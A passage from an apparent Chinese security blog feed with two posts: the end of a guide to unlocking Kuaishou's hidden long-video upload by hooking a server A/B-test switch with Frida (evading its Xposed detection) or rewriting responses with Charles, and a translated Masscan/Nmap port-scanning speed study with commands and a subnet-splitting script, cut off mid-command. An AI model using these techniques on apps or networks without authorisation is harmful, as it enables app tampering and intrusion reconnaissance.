alt=""></p><p>看到有个按钮但是有个判断会把他设置不可见，那么直接看这个判断方法：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g6591krp38j30u009k75g.jpg" alt=""></p><p>看到这里有很多个条件判断，第一个是判断进入的intent中的这个字段是否为true，不过这个默认值就是true，然后就是第二个方法了，全局搜索这个方法，在第5个dex中找到代码：</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g6591tonusj30u009k75g.jpg" alt=""></p><p>看到这里会读取一个字段值，继续看：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g65920zg1kj30s60hqdj1.jpg" alt=""></p><p>到这里看到这个应该是个服务端下发的开关，而这个应该是有ABTest操作，关于ABTest功能都是很多公司采用的操作，就是AB实验，有两个结果然后通过这两个结果观察数据对比，哪个值会更有正向的结果，比如这个开关开的话会增加投稿率？还是关闭会增加投稿率呢？不过看了这么多我们可以直接hook上面的方法即可：</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g6592dpzmdj30u00dajty.jpg" alt=""></p><p>运行之后发现不可思议的事情了，没有任何日志信息，期初肯定认为是hook代码写的问题，不过最后经过检查直接hook当前页面的Activity的方法也是无效，所以到这里可以很肯定内部做了防Xposed的操作，其实现在越来越多的公司会对自己的应用做一些防护了，关于如何干掉这个防护下篇文章会介绍，那么到这里有两条路可以走，<strong>第一个是基于abtest抓包然后map local操作把开关打开</strong>，关于map local操作不了解的同学可以去网上搜一下Charles的map local操作设置，就是把网络返回值改一下，操作很简单，这里不介绍了，<strong>还有一种方式就是利用其它hook工具继续拦截操作</strong>。</p><h2 id="3、Hook开启功能"><a href="#3、Hook开启功能" class="headerlink" title="3、Hook开启功能"></a>3、Hook开启功能</h2><p>当然到这里作为良心公众号，这两种方式我都会做，因为结果不重要，重要的是享受这个过程，首先看看怎么hook呢？他都做了防护操作，不过可惜的是他防护只对Xposed，而其他的hook工具并没有，因为我直接用了更好用的Frida工具直接操作：</p><h3 id="1-运行设备的frida-server"><a href="#1-运行设备的frida-server" class="headerlink" title="1.运行设备的frida-server"></a>1.运行设备的frida-server</h3><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g65930jysgj30i805kgme.jpg" alt=""></p><h3 id="2-转发端口号"><a href="#2-转发端口号" class="headerlink" title="2.转发端口号"></a>2.转发端口号</h3><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g6593e2zc2j30ic040weu.jpg" alt=""></p><h3 id="3-运行脚本"><a href="#3-运行脚本" class="headerlink" title="3.运行脚本"></a>3.运行脚本</h3><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g65943fc8lj30u0097gn4.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g6594ht4hoj30mi0buq65.jpg" alt=""></p><p>​    看到可以hook操作了，所以不知道为何他都对Xposed防护了，却没有对frida进行防护，其实想想可以明白，在之前的frida文章介绍中：<a href="http://mp.weixin.qq.com/s?__biz=MzIzNDA3MDgwNA==&amp;mid=2649230946&amp;idx=1&amp;sn=3b23f7d6b329e57d5bdd3c6e866f745c&amp;chksm=f0e75819c790d10f2c529bff17c54772379ef95ecac1caa1f9a858ec008a04430bc8604163a7&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">Hook新工具Frida用法详解</a> 中介绍了关于Xposed和Frida的区别，对于快手这样的应用，其他他的防护目的很简单就是防止你写插件进行一些违规操作，但是Frida是基于PC端操作的工具，而Xposed是可以安装到设备中随手可以操作所以从危险性和操作便捷上来说Xposed更危险，而Frida的操作成本更大。hook之后我们直接把方法返回值设置成false即可：</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g6594ucpwbj30r41b2td5.jpg" alt=""></p><p>好了，我们到这里就有了长视频权限，其他也就是最多上传10分钟的功能，不过到这里还没结束，因为还有第二种方式操作，就是通过抓包替换服务端返回的数据进行操作</p><h2 id="4、抓包开启功能"><a href="#4、抓包开启功能" class="headerlink" title="4、抓包开启功能"></a>4、抓包开启功能</h2><p>因为之前分析代码看到他的这个功能有一个类似于abtest开关的操作，所以我们通过抓包过滤abtest字样：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g65965kjhdj30u00n4jua.jpg" alt=""></p><p>通过抓包看到这个字段值是0，表示关闭这个功能，我们把这个返回内容保存一下，然后把值修改成1即可：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g6596fd3wjj30ne0b0q45.jpg" alt=""></p><p>然后在抓包看看效果：</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g6596m21w2j30u00p5mzt.jpg" alt=""></p><p>服务端的值已经修改成功了，可以看一下效果也是可以出来长视频功能的，当然我们发现这里还有一个字段：</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g6596za7abj30ne086wff.jpg" alt=""></p><p>看到了这个是iOS的开关字段，不过好奇为啥Android和iOS的字段要用两个，我们可以把iOS抓包替换，然后也可以体验效果。所以看到我们通过分析代码发现有服务端下发字段开关，这样通过map local操作会更加方便。</p><h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><p>1、关于找到应用破解入口我们有无数种方法，抓包、获取资源id、文案信息、当前页面信息等都是可以的</p><p>2、现在很多应用对Xposed做了防护操作，不过hook工具不只是这一个，我们可以用Frida，当然还有其他的工具</p><p>3、现在很多公司都有ABTest开关下发操作，我们如果能够快速找到这个字段可以两端都可以查看效果，都不需要进行hook操作了。</p><h2 id="6、参考链接"><a href="#6、参考链接" class="headerlink" title="6、参考链接"></a>6、参考链接</h2><p><strong>文章转载自微信公众号：</strong> <a href="https://mp.weixin.qq.com/s/4gjHJSO2Yv-CH-jlP4zQDg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4gjHJSO2Yv-CH-jlP4zQDg</a></p><p><strong>作者：</strong> 尼古拉斯.赵四</p>]]></content>
      
      <categories>
          
          <category> 安卓逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓逆向 </tag>
            
            <tag> 快手 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>端口扫描中速度与准确度的平衡</title>
      <link href="/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E4%B8%AD%E9%80%9F%E5%BA%A6%E4%B8%8E%E5%87%86%E7%A1%AE%E5%BA%A6%E7%9A%84%E5%B9%B3%E8%A1%A1/"/>
      <url>/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E4%B8%AD%E9%80%9F%E5%BA%A6%E4%B8%8E%E5%87%86%E7%A1%AE%E5%BA%A6%E7%9A%84%E5%B9%B3%E8%A1%A1/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><script type="text/javascript" src="/js/src/bai.js"></script><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>​    侦察是每个bug bounty(漏洞赏金)和渗透测试过程中最重要的阶段，一次好的侦察能决定成败。侦察可以分为两类：主动和被动。在主动侦察期间主要使用的方法之一就是端口扫描。渗透测试人员和bug hunters(漏洞赏金猎人)使用端口扫描确定目标主机和网络上的哪些端口是开放的，以及识别在这些端口上运行的服务。</p><p>​    但是，端口扫描总是需要在速度和精度之间进行权衡。在渗透测试期间，测试人员的时间都是有限的；而在bug bounty过程中，大家都是争先恐后的发现并提交漏洞，拼的是速度。这些原因迫使我们在端口扫描时优先考虑的是速度，而不是精度。而在于时间赛跑的过程中，我们可能会错过一些开放的端口，而恰巧这些端口可能就存在漏洞，并且能成功利用。</p><p>​    本次研究旨在利用开源和大家熟知的工具在端口扫描期间找到速度和准确度之间的平衡。</p><h2 id="0x02-端口扫描概述"><a href="#0x02-端口扫描概述" class="headerlink" title="0x02 端口扫描概述"></a>0x02 端口扫描概述</h2><p>​    端口扫描是侦察期间最常用的技术之一。渗透测试人员和bug bonty用于识别主机上可用的开放端口，以及识别这些开放端口上运行的服务。</p><p>端口扫描器可以根据他们的操作方式分类为：面向连接（同步模式）扫描器和无连接的（异步模式）扫描器。</p><h3 id="面向连接（同步模式）"><a href="#面向连接（同步模式）" class="headerlink" title="面向连接（同步模式）"></a>面向连接（同步模式）</h3><p>​    这种类型的扫描器想目标端口发送请求并等待响应，直到超时时间到期。这种类型扫面器的缺点是性能比较慢，因为扫描器在当前连接关闭之前不会去扫描下一个目标端口或ip。</p><p>面向连接的扫描器好处是它们更准确，因为它们可以识别丢弃的数据包。<br>面向连接扫描器最流行就是我们熟知的<strong>Nmap</strong>。</p><h3 id="无连接（异步模式）"><a href="#无连接（异步模式）" class="headerlink" title="无连接（异步模式）"></a>无连接（异步模式）</h3><p>无连接扫描器不依赖于当前被探测端口的完成来启动下一个端口，因为它们有单独的发送和接受线程。这允许它们进行高速扫描。但是，这些扫描器的结果可能不太准确，因为它们无法检测丢失的数据包。</p><p><strong>Masscan</strong>和<strong>Zmap</strong>是目前最流行的两种无连接扫描器。</p><h2 id="0x03-Nmap-VS-Masscan"><a href="#0x03-Nmap-VS-Masscan" class="headerlink" title="0x03 Nmap VS Masscan"></a>0x03 Nmap VS Masscan</h2><blockquote><p>本次研究只包括Nmap和Masscan。虽然Zmap是一个快速的扫描器，并且扫描结果还不错。但是根据经验，即使同时运行多个扫描任务，Zmap的扫描速度仍然很慢。</p></blockquote><p>虽然Nmap和Masscan都提供了良好的性能、特性和扫描结果。但它们 仍然有自己的弱点。下表展示了这两种工具的优缺点。</p><table><thead><tr><th></th><th>Nmap</th><th>Masscan</th></tr></thead><tbody><tr><td>优点</td><td>-两者对比起来，它更精确（使用同步模式） -有很多功能 -同时接受域名和IP地址（IPv4和IPv6）</td><td>-速度非常快（使用异步模式） -语法与Nmap非常相似</td></tr><tr><td>缺点</td><td>-扫描数十万目标的时候速度非常慢</td><td>-在高速率(rates)扫描大端口范围时结果不太准确<a href="https://github.com/robertdavidgraham/masscan/issues/365" target="_blank" rel="noopener">[1]</a> -不接受域名作为目标输入 -不能根据自身环境自动调整传输速率</td></tr></tbody></table><h2 id="0x04-研究思路"><a href="#0x04-研究思路" class="headerlink" title="0x04 研究思路"></a>0x04 研究思路</h2><p>基于上面列出的工具的有点和缺点，在试图找到速度和准确度之间的平衡时，确定了一下解决方案和问题。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>以下是基于工具的优点而形成的：</p><ol><li>将Nmap的准确性及其其他的功能与Masscan的速度相结合。</li><li>使用Masscan执行初始端口的扫描，以识别开放的端口和开端口的主机。</li><li>使用Masscan的结果（已识别的开放端口和主机）作为Nmap的输入，以进行详细的端口扫描。</li></ol><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>虽然上面列出的想法很好，但是我们仍然需要解决每个工具的缺点。具体来说，我们需要解决的有：</p><ol><li>当扫描数数万个目标的时候，Nmap的速度很慢。</li><li>Masscan在高速(rates)扫描大端口范围时的不准确性（参见Github的<a href="https://github.com/robertdavidgraham/masscan/issues/365" target="_blank" rel="noopener">Issues 365</a>）。</li></ol><h2 id="0x05-研究配置"><a href="#0x05-研究配置" class="headerlink" title="0x05 研究配置"></a>0x05 研究配置</h2><h3 id="目标网络"><a href="#目标网络" class="headerlink" title="目标网络"></a>目标网络</h3><p>选择一下子网作为本次研究的网络目标：</p><table><thead><tr><th>目标</th><th>子网</th></tr></thead><tbody><tr><td>A</td><td>A.A.0.0/16</td></tr><tr><td>B</td><td>B.B.0.0/16</td></tr><tr><td>C</td><td>C.C.0.0/16</td></tr><tr><td>D</td><td>D.D.0.0/16</td></tr></tbody></table><h3 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h3><p>对于本次研究，两种工具都有自己的一些测试用例。这些测试用例是每种工具中可用的不同选项（参数）的变化。这些测试用例旨在解决工具的缺点，并利用它们的优点在速度和准确性之前找到平衡点。</p><h4 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan:"></a>Masscan:</h4><ol><li>以不同的速率(rates)定期扫描所有的TCP端口。</li><li>将/16的目标子网差分为/20，并运行X个并发masscan任务，每个任务的速率为Y。</li><li>将1-65535的端口范围划分为几个范围，并运行X个并发的Masscan任务，每个任务的速率为Y。</li></ol><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h4><ol><li>定期扫描所有的TCP端口。</li><li>使用X并发任务扫描所有的TCP端口。</li><li>扫描Masscan识别的开放端口和主机的组合列表。</li><li>扫描Masscan识别特定主机上的特定开放端口。</li></ol><blockquote><p>在有限的时间内不可能涵盖所有选项的每个变化/组合，因此仅涵盖上述内容。</p></blockquote><p>对于使用并发任务的测试用例，使用了工具<a href="https://www.gnu.org/software/parallel/" target="_blank" rel="noopener">GNU Parallel</a>。如果你对这个工具还是个新手，请查看详细的<a href="https://www.gnu.org/software/parallel/parallel_tutorial.html" target="_blank" rel="noopener">教程</a>。</p><h2 id="0x06-范围和限制"><a href="#0x06-范围和限制" class="headerlink" title="0x06 范围和限制"></a>0x06 范围和限制</h2><ul><li>该研究使用以下版本的工具进行：Nmap v7.70和Masscan v1.0.5-51-g6c15edc；</li><li>该研究仅涉及IPv4地址；</li><li>不包括扫描UDP端口；</li><li>仅使用了最流行和开源的工具（不包括Zmap，因为它一次只能扫描一个端口；即使运行多个任务，也会导致扫描速度非常慢）；</li><li>仅探测了4个目标网络，都是/16；</li><li>端口扫描仅来自一台机器，且这台机器的ip地址是固定ip；</li><li>由于扫描机器不支持PF_RING，因此Masscan的速率仅限于<strong>250kpps(每秒数据包)</strong>；</li><li>并不是所有的测试用例都是由有限的资源而进行的（这样做非常耗时）。</li></ul><h2 id="0x07-Masscan的测试用例和测试结果"><a href="#0x07-Masscan的测试用例和测试结果" class="headerlink" title="0x07 Masscan的测试用例和测试结果"></a>0x07 Masscan的测试用例和测试结果</h2><p>本节详细介绍了使用Masscan执行的不同测试用例和其测试结果。</p><h3 id="测试用例-1：使用不同的速率定期扫描所有的TCP端口"><a href="#测试用例-1：使用不同的速率定期扫描所有的TCP端口" class="headerlink" title="测试用例 1：使用不同的速率定期扫描所有的TCP端口"></a>测试用例 1：使用不同的速率定期扫描所有的TCP端口</h3><p>这个测试用例没啥特别之处，这只是Masscan的正常扫描，只是速率不同而已。</p><p>以下命令用于启动此扫描用例的扫描任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p 1-65535 --rate RATE--wait 0 --open TARGET_SUBNET -oG TARGET_SUBNET.gnmap</span><br></pre></td></tr></table></figure><p>rate(扫描速率)参数的设置：</p><ul><li>1000000 (1M)</li><li>100000 (100K)</li><li>50000 (50K)</li></ul><p>在实验过程中，我得VPS可以运行的最大速率仅为250kpps左右。这是因为扫描的机器不支持PF_RING。</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g652nubapxj30va04nt9i.jpg" alt=""></p><p><strong>图表（由于最大速率是250kpps，故图表中的为250k、100k和50k的对比）：</strong></p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g652ogwq3zj31f00u0dx1.jpg" alt=""></p><p><em>观察：</em></p><ul><li>较慢的速率会导致更多的开放端口，但代价是会扫描时间更长。</li></ul><h3 id="测试用例-2：将-16的目标子网拆分为-20，并运行X个Masscan并发任务，每个任务的速率为Y"><a href="#测试用例-2：将-16的目标子网拆分为-20，并运行X个Masscan并发任务，每个任务的速率为Y" class="headerlink" title="测试用例 2：将/16的目标子网拆分为/20，并运行X个Masscan并发任务，每个任务的速率为Y"></a>测试用例 2：将/16的目标子网拆分为/20，并运行X个Masscan并发任务，每个任务的速率为Y</h3><p>为了能够运行并发任务，我觉得将/16的目标子网拆分为更小的子网。你可以将其分为更小的子网，例如/24。本次研究我拆分为/20。</p><p>要将目标网络拆分为更小的子网，使用的python代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import ipaddress, sys</span><br><span class="line"></span><br><span class="line">target = sys.argv[1]</span><br><span class="line">prefix = int(sys.argv[2])</span><br><span class="line"></span><br><span class="line">for subnet in ipaddress.ip_network(target).subnets(new_prefix=prefix):</span><br><span class="line">    print(subnet)</span><br></pre></td></tr></table></figure><p>以下是该代码的运行截图：</p><p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g652pwqmsoj30kr0cngmz.jpg" alt=""></p><p>每项任务所用的速率都是基于扫描机器能够处理的速率最大化思想。在我的例子中，我的扫描机器最大只能处理250kpps，所以如果我要运行5个并行任务，每个任务可使用50kpps的速率。</p><blockquote><p>由于机器的最大速率不是“绝对”的（在本次测试中不完全都是250kpps的速率），你可以设置每个任务的速率，使总速率等于最大速率的80%-90%。</p></blockquote><p>对于本项测试，执行了以下命令。通过split.py来划分成较小的子网，然后使用parallel命令来运行并行任务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 split.py TARGET_SUBNET 20 | parallel -j JOBS &quot;masscan -p 1-65535 --rate RATE--wait 0 --open &#123;&#125; -oG &#123;//&#125;.gnmap&quot;</span><br></pre></td></tr></table></figure><p>以下是执行上述命令时的截图。在这种情况下，20个Masscan任务，每个任务的速率为10kpps，同时运行。</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g652qu41nuj31b90fb11u.jpg" alt=""></p><p><strong>任务数和速率如下：</strong></p><ul><li>5个任务/每个任务的速率是100kpps (–rate 100000 )</li><li>5个任务/每个任务的速率是50kpps (–rate 50000)</li><li>20个任务/每个任务的速率是10kpps (–rate 10000)</li></ul><blockquote><p><strong>说明：</strong></p><ul><li>大家可以注意到，我上面说的任务数和速率中第一个（5个任务/每个任务的速率是100kpps），我计算错了。因为它的总速率是500kpps，而我的机器只能处理250kpps。尽管如此，这个的测试结果仍然是有价值的，将可以在下面的图表里看到。</li><li>其他的组合，例如10个任务，每个任务的速率20kpps，这样是可行的。但是由于时间和预算有限，我不能把所有可能的组合都涵盖了。</li></ul></blockquote><p><strong>图表如下：</strong></p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g652raqlu7j31f00u0aqx.jpg" alt=""></p><p><strong>观察：</strong></p><ul><li>当前的方案会比常规扫描（测试用例 ＃1）快2-3倍，但是导致开放的端口更少了。</li><li>使用扫描机器的最大速率将导致扫描出的开放端口数更少（五个任务/每个任务100k的扫描速率）。</li><li>少任务数&amp;高扫描速率（例如5个任务/每个任务的速率50k）比多任务数&amp;低扫描速率（例如20个任务/每个任务的速率10k）的效果好。</li></ul><h3 id="测试用例-3：将1-65535端口范围拆分为多个更小的范围，运行X个Masscan并发任务，每个任务的扫描速率为Y"><a href="#测试用例-3：将1-65535端口范围拆分为多个更小的范围，运行X个Masscan并发任务，每个任务的扫描速率为Y" class="headerlink" title="测试用例 3：将1-65535端口范围拆分为多个更小的范围，运行X个Masscan并发任务，每个任务的扫描速率为Y"></a>测试用例 3：将1-65535端口范围拆分为多个更小的范围，运行X个Masscan并发任务，每个任务的扫描速率为Y</h3><p>第三个测试用例是为了解决在扫描大端口范围的时候，上文提到的Masscan的<a href="https://github.com/robertdavidgraham/masscan/issues/365" target="_blank" rel="noopener">问题</a>，特别是整个1-65535这样的范围。我的解决方案是将1-65535的范围拆分为更小的范围。</p><p>就像之前的测试用例一样，所使用的任务数&amp;扫描速率组合的总速率是基于机器最大容量的80-90%这样的想法。</p><p>以下的命令用于本次的测试用例，PORT_RANGES是包含端口范围列表，然后使用parallel命令来运行并行任务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat PORT_RANGES | parallel -j JOBS &quot;masscan -p &#123;&#125; --rate RATE --wait 0 --open TARGET_SUBNET -oG &#123;&#125;.gnmap&quot;</span><br></pre></td></tr></table></figure><p>1-65535端口范围分为四种拆分方式，如下所示，每种拆分方式包含任务和速率的组合/变化。</p><h4 id="拆分方式-1：拆分为5个端口范围"><a href="#拆分方式-1：拆分为5个端口范围" class="headerlink" title="拆分方式 1：拆分为5个端口范围"></a>拆分方式 1：拆分为5个端口范围</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1-13107</span><br><span class="line">13108-26214</span><br><span class="line">26215-39321</span><br><span class="line">39322-52428</span><br><span class="line">52429-65535</span><br></pre></td></tr></table></figure><p><strong>任务数和速率如下：</strong></p><ul><li>5个扫描任务/每个任务50k的扫描速率 (–rate 50000)</li><li>2个扫描任务/每个任务100k的扫描速率 (–rate 100000)</li></ul><p><strong>图表如下：</strong></p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g652sey6q6j31f00u0ndt.jpg" alt=""></p><h4 id="拆分方式-2：拆分为2个端口范围"><a href="#拆分方式-2：拆分为2个端口范围" class="headerlink" title="拆分方式 2：拆分为2个端口范围"></a>拆分方式 2：拆分为2个端口范围</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1-32767</span><br><span class="line">32768-65535</span><br></pre></td></tr></table></figure><p><strong>任务数和速率如下：</strong></p><ul><li>2个扫描任务/每个任务100k的扫描速率 (–rate 100000)</li><li>2个扫描任务/每个任务125k的扫描速率 (–rate 125000)</li></ul><p><strong>图表如下：</strong></p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g652svpwj5j31ex0u0k69.jpg" alt=""></p><h4 id="拆分方式-3：-拆分为8个端口范围"><a href="#拆分方式-3：-拆分为8个端口范围" class="headerlink" title="拆分方式 3： 拆分为8个端口范围"></a>拆分方式 3： 拆分为8个端口范围</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1-8190</span><br><span class="line">8191-16382</span><br><span class="line">16383-24574</span><br><span class="line">24575-32766</span><br><span class="line">32767-40958</span><br><span class="line">40959-49151</span><br><span class="line">49152-57343</span><br><span class="line">57344-65535</span><br></pre></td></tr></table></figure><p><strong>任务数和速率如下：</strong></p><ul><li>4个扫描任务/每个任务50k的扫描速率 (–rate 50000)</li><li>2个扫描任务/每个任务100k的扫描速率 (–rate 100000)</li></ul><p><strong>图表如下：</strong></p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g652u2de2ej31ex0u0dw1.jpg" alt=""></p><h4 id="拆分方式-4：-拆分为4个端口范围"><a href="#拆分方式-4：-拆分为4个端口范围" class="headerlink" title="拆分方式 4： 拆分为4个端口范围"></a>拆分方式 4： 拆分为4个端口范围</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1-16383</span><br><span class="line">16384-32767</span><br><span class="line">32768-49151</span><br><span class="line">49152-65535</span><br></pre></td></tr></table></figure><p><strong>任务数和速率如下：</strong></p><ul><li>2个扫描任务/每个任务100k的扫描速率 (–rate 100000)</li></ul><blockquote><p>本次测试我之所以只使用了一种任务数&amp;速率的组合，是因为我意识到我已经超过了每个月的带宽限制。这样我不得不多付100+美元。</p></blockquote><p><strong>图表如下：</strong></p><p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g652ub53f4j31ex0u018i.jpg" alt=""></p><p><strong>观察：</strong></p><blockquote><p>下面列出的观察结果涵盖了上面提到的所有4个拆分方式的方案。</p></blockquote><ul><li>拆分端口范围会扫描出更多的开放端口（这样解决了Masscan在扫描大范围端口时的<a href="https://github.com/robertdavidgraham/masscan/issues/365" target="_blank" rel="noopener">问题</a>）;</li><li>使用更少的并行任务（本次测试中是2个并行任务）会扫描出更多的开放端口；</li><li>在所有的拆分方案的测试中，拆分为5个端口范围（拆分方式# 1）的扫描结果最佳。</li></ul><p><strong>原始数据</strong></p><p>下表显示了使用上述不同Masscan测试用例进行实验的原始数据：</p><p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g652v04v5yj369l0u04qr.jpg" alt=""></p><h3 id="Masscan结论："><a href="#Masscan结论：" class="headerlink" title="Masscan结论："></a>Masscan结论：</h3><p>根据使用Masscan进行的所有测试用例的结果，得出以下结论：</p><ul><li>以100％的CPU利用率运行扫描任务，会导致端口开放性降低；</li><li>使用机器能运行的最大速率容量进行扫描会导致更少的端口开放；</li><li>当使用并发任务时，较少的任务数会扫描出更多的开放端口；</li><li>拆分端口范围的方式比拆分目标子网的方式要好；</li><li>对于端口范围拆分的方式，（拆分方式 #1 和拆分方式 #4）的扫描结果是最佳的。</li></ul><h2 id="0x08-Nmap的测试用例和测试结果"><a href="#0x08-Nmap的测试用例和测试结果" class="headerlink" title="0x08 Nmap的测试用例和测试结果"></a>0x08 Nmap的测试用例和测试结果</h2><p>在此阶段，只执行版本扫描。Nmap的NSE，OS探测和其他扫描功能都没有涉及。Nmap的线程被限制为T4，等同于如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--max-rtt-timeout=1250ms --min-rtt-timeout=100ms --initial-rtt-timeout=500ms --max-retries=6 --max-scan-delay=10ms</span><br></pre></td></tr></table></figure><p>以下Nmap选项也用于模拟masscan使用的选项。这些选项应用于所有Nmap测试用例。</p><p>使用的Nmap选项如下：</p><ul><li>SYN扫描方式（<code>-sS</code>）</li><li>端口服务版本扫描（<code>-sV</code>）</li><li>线程（<code>-T4</code>）</li><li>随机选择扫描对象（<code>--randomize-hosts</code>）</li><li>no ping（<code>-Pn</code>）</li><li>no DNS解析（<code>-n</code>）</li></ul><h3 id="测试用例-1：定期扫描所有的TCP端口"><a href="#测试用例-1：定期扫描所有的TCP端口" class="headerlink" title="测试用例 1：定期扫描所有的TCP端口"></a>测试用例 1：定期扫描所有的TCP端口</h3><p>这个测试用例只是使用Nmap的正常扫描，所以没啥特别之处。使用的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sSV -p- -v --open -Pn -n --randomize-hosts -T4 TARGET_SUBNET -oA OUTPUT</span><br></pre></td></tr></table></figure><p><em>观察：</em></p><ul><li>扫描了四天半以后，扫描任务仍然没有完成。这就是前文提到的缺点之一：扫描大型网络目标的时候，Nmap的速度非常慢；</li><li>由于性能太低，我决定取消这个扫描任务。</li></ul><h3 id="测试用例-2：使用X个并发任务扫描所有的TCP端口"><a href="#测试用例-2：使用X个并发任务扫描所有的TCP端口" class="headerlink" title="测试用例 2：使用X个并发任务扫描所有的TCP端口"></a>测试用例 2：使用X个并发任务扫描所有的TCP端口</h3><p>在这种情况下，我尝试通过运行并发的Nmap扫描任务来解决Nmap的低性能问题。通过将目标子网划分为较小的子网块来完成，就像上面Masscan测试的那样。同样，下面的代码（split.py）用于拆分目标子网：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import ipaddress, sys</span><br><span class="line"></span><br><span class="line">target = sys.argv[1]</span><br><span class="line">prefix = int(sys.argv[2])</span><br><span class="line"></span><br><span class="line">for subnet in ipaddress.ip_network(target).subnets(new_prefix=prefix):</span><br><span class="line">    print(subnet)</span><br></pre></td></tr></table></figure><p>运行命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 split.py TARGET_SUBNET 20 | parallel -j JOBS &quot;sudo nmap -sSV -p- -v --open -Pn -n --randomize-hosts -T4 &#123;&#125; -oA &#123;//&#125;&quot;</span><br></pre></td></tr></table></figure><p>对于这个测试用例，我决定使用两个并发任务实例，如下所示：</p><p><strong>使用5个并发任务：</strong> /16的目标子网拆分为/20的子网*</p><p><em>观察：</em></p><ul><li>也很慢。扫了2.8天，仍然没扫完，所以我取消了。</li></ul><p><strong>使用64个并发任务：</strong> /16的目标子网拆分为/24的子网*</p><p><em>观察：</em></p><ul><li>五天过去了，扫描仍然没有完成，所以我也取消了。</li></ul><h3 id="测试用例-3-扫描Masscan识别出的开放端口和主机的组合列表"><a href="#测试用例-3-扫描Masscan识别出的开放端口和主机的组合列表" class="headerlink" title="测试用例 3: 扫描Masscan识别出的开放端口和主机的组合列表"></a>测试用例 3: 扫描Masscan识别出的开放端口和主机的组合列表</h3><p>这个测试用例背后的想法是，首先获得一个主机列表和一个由Masscan扫描出的开放端口的组合列表。这个开放端口的组合列表被用作基线（如下图图表中的绿色条所示），以确定下面的Nmap测试用例能否能检测出更多或更少的k开放端口。</p><p>例如，Masscan检测到300个开放端口，而常规Namp扫描检测到320个开放端口。但是，当使用5个并发Nmap任务扫描时，仅检测到295个开放端口。这意味着常规的Nmap扫描是更好的选择。</p><p>要从Masscan的扫描结果中获得主机列表，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Host:&quot; MASSCAN_OUTPUT.gnmap | cut -d &quot; &quot; -f2 | sort -V | uniq &gt; 